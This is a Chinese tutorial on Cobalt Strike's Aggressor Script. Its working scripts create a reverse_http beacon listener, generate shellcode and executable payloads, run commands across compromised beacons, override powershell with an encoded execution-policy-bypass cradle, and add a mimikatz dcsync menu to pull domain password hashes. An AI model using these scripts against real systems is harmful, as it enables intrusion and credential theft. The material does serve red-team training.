什么是agscript


agscript为Aggressor Script的简写,agscript是一种简单脚本语言，主要用于红队编写针对肉鸡的攻击脚本。它有两个作用，一是可以用来对自己的肉鸡做持久性控制，二是可以用来扩展或修改Cobalt Strike客户端以满足您的个性化需求。

脚本加载


在客户端的CobaltStrike的script manager中可以看到已经加载的脚本。

或者view-->script console打开脚本控制台，输入ls便可看到已经加载的命令。

基础命令如下：

输入help即可查看这些命令。

或者使用客户端的形式加载脚本：

./agscript [host] [port] [user] [password] [/path/to/script.cna]
Sleep


agscript是基于Raphael Mudge的Sleep语言的二次开发的。原文档见:

http://sleep.dashnine.org/manual/

sleep的语法首先要注意的就是，语句之间必须要有空格。比如：

$a = 1 + 2

在Sleep中常见的数据类型有：数字、字符串、数组、列表、集合、字典等

$long = 4L;
$first = "First";
$list = @("a", "b", "c");
$hash = %(a => "apple", b => "boy", c => 3 * (9 % 7))；

@和％函数即可创建数组和字典

Sleep使用#作为注释。

Sleep会插入双引号的字符串，这意味着以$符号开头的任何以空格分隔的标记都将替换为其值。特殊变量$+将插字符串与另一个值连接起来。

下面我们来看一个demo大家就能明白了：

on ready{	$long = 4L;
	$first = "First";
	$list = @("a", "b", "c");
	$hash = %(a => "apple", b => "boy", c => 3 * (9 % 7));
	println("\$list is: $list and \n\$first with \$long is $long $+ $first");
	closeClient();}

除了标准的输出函数，我们还可以使用warn来进行输出，而且该函数提供代码位置，方便调试。

on ready{	$long = 4L;
	$first = "First";
	$list = @("a", "b", "c");
	$hash = %(a => "apple", b => "boy", c => 3 * (9 % 7));
	println("\$list is: $list and \n\$first with \$long is $long $+ $first");
	warn($long);
	closeClient();}

使用sub字符即可声明函数，传给函数的参数标记为$1,$2,一直到$n。函数可以接受无数个参数。变量@_是一个包含所有参数的数组，$1，$2等变量的更改将改变@_的内容

在Sleep语法中，函数是任何其他对象的首选类型

$addf = &add

即addf调用了add，那么传参就可以像下面这样进行：

[$addf : 3, 4];

比如下面的demo：

on ready{	sub add {
    	println($1 + $2);
	}	add(4, 5);
	$addf = &add;	[$addf : 4 , 5];
	[$add : 4 , 5];
	closeClient();}

脚本交互


agscript可以使用command创建快捷命令，看下面的demo

command foo {
    println("Hello $1");
}

可以看到foo就是我们注册的命令，而参数就是$1来获取，其他的以此类推。

如果想更改控制台的颜色的话，也是可以的，颜色速差表如下：

command foo {
    println("Hello \c4$1");
}

数据模型


＆data_query函数即可查询到Cobalt Strike的数据模型。这个函数可以访问Cobalt Strike客户端维护的所有状态和信息。使用**＆data_keys**多了一个可以查询制定数据的功能 用法可参照官方demo：

command export {
    local('$handle $model $row $entry $index');    $handle = openf(">export.txt");

    foreach $model (data_keys()) {
        println($handle, "== $model ==");
        println($handle, data_query($model));
    }    closef($handle);

    println("See export.txt for the data.");
}

cs提供了x，让我们进行调试

同样可以使用前面的on来监听数据模型的变化。

监听器


获取所有监听器名称的列表可以使用＆listeners函数,只使用本地侦听器的话用＆listeners_local函数,＆listener_info函数可将监听器名称解析为其配置信息，demo：

command listeners {
    local('$name $key $value');
    foreach $name (listeners()) {
        println("== $name == ");
        foreach $key => $value (listener_info($name)) {
            println("$[20]key : $value");
        }
    }
}

监听器创建、删除、选择


cs中使用&listener_create函数，用法很简单，就是把监听器的参数放到函数中充当参数即可，demo：

listener_create("shell2","windows/beacon_http/reverse_http","127.0.0.1",7777)

其他的同理，记得替换相应的值就行。

至于删除就比较简单了，使用listener_delete函数即可，然后传入我们的监听器名称。

生产器的选择我们使用openPayloadHelper，小demo:

item "&Spawn" {
    openPayloadHelper(lambda({
        binput($bids, "spawn $1");
        bspawn($bids, $1);
    }, $bids => $1));
}
各种生成


shellcode生成使用shellcode函数，依次传入监听器名称、是否与外部通信、系统架构

demo：

command shellcode {	$data = shellcode("my listener", false, "x86");	$handle = openf(">out.bin");
	writeb($handle, $data);
	closef($handle);
}

exe/dll生成用&artifact函数，比shellccode多了一个文件类型参数，具体支持如下：

demo：

command shellcode {    $data = artifact("shell", "vbscript",false);    $handle = openf(">1.vbs");
    writeb($handle, $data);
    closef($handle);
}

Stageless使用&artifact_stageless，除了多了一个代理信息，其余的与exe、dll的无异，demo:

sub ready {    local('$handle');
    $handle = openf(">out.exe");
    writeb($handle, $1);
    closef($handle);
}

artifact_stageless("shell", "exe", "x86", "", &ready);
元数据的处理


Cobalt Strike给每个Beacon会话都分配了一个随机ID，执行任务时任务的元数据与每个Beacon的ID相关联，使用beacons函数可查询到查询所有当前Beacon会话的元数据，

demo：

command beacons {
    local('$entry $key $value');
    foreach $entry (beacons()) {
        println("== " . $entry['id'] . " ==");
        foreach $key => $value ($entry) {
            println("$[20]key : $value");
        }        println();
    }
}
右键菜单


官方demo如下：

popup beacon_bottom {
    item "Run All..." {
        prompt_text("Which command to run?", "whoami /groups", lambda({            binput(@ids, "shell $1");
            bshell(@ids, $1);

简单解释一下代码：run all为弹出的菜单，prompt_text的第一个参数为弹出的信息，第二个为默认值，然后下面使用lambda进行输入的获取、执行，然后将结果展示。

也就是使用beacon_top和beacon_bottom进行菜单的展示。

alice


对于这个东西，我的理解就是可以进行原有东西的覆盖和生成新的任务，比如：

alias powershell {    local('$args $cradle $runme $cmd');

    # $0 is the entire command with no parsing.    $args   = substr($0, 11);

    # generate the download cradle (if one exists) for an imported PowerShell script    $cradle = beacon_host_imported_script($1);

    # encode our download cradle AND cmdlet+args we want to run
    $runme  = base64_encode( str_encode($cradle . $args, "UTF-16LE") );

    # Build up our entire command line.    $cmd    = " -nop -exec bypass -EncodedCommand \" $+ $runme $+ \"";

    # task Beacon to run all of this.
    btask($1, "Tasked beacon to run: $args", "T1086");
    beacon_execute_job($1, "powershell", $cmd, 1);
}

便可以覆盖原有的powershell。了解基础语法之后，配合https://www.cobaltstrike.com/aggressor-script/functions.html即可编写出基本的脚本。

脚本编写


首先，我们的脚本是mimikatz，那么开头就是这样的：

popup beacon_bottom {    item "mimikatz" {
    }
}

这样就能实现右键弹出来mimikatz的菜单。然后去到cs的函数页面，搜mimitakz进行调用。

先给出结果：

popup beacon_bottom {
    menu "mimikatz" {
    		item "Mimikatz-bdcsync"{    			local('$bid');                foreach $bid ($1){
                    mimikatz_bdcsync($bid);
                }
    	}	
    }
}sub mimikatz_bdcsync{
	$bid = $1;	
	$dialog = dialog("DomainInfo" , %(beacon => $1 , domain => "PLAYLAND.testlab" , user => "PLAYLAND\\Administrator") , lambda({
	bdcsync($3["beacon"] , $3["domain"] , $3["user"])
	}));
	dialog_description($dialog, "Use mimikatz's dcsync command to pull a user's password hash from a domain controller.");
	drow_text($dialog, "beacon",  "Beacon:");
	drow_text($dialog, "domain", "Domain:");
	drow_text($dialog, "user", "User:");
	dbutton_action($dialog, "Launch");
	dialog_show($dialog);
}

实现原理就是使用drow_text来制作一个弹出的菜单，然后使用$dialog依次存放获取的值，dbutton_action是按钮，dialog_show用来显示，dialog_description是相关的描述信息，然后使用 lambda来执行我们的函数，$bid = $1; 来获取事件的操作，当你的按钮多的时候比较有用，比如多一个help，然后local定义一个局部变量，使用foreach来监听，让点击运行是，收到信号，执行我们的mimikatz_bdcsync函数。
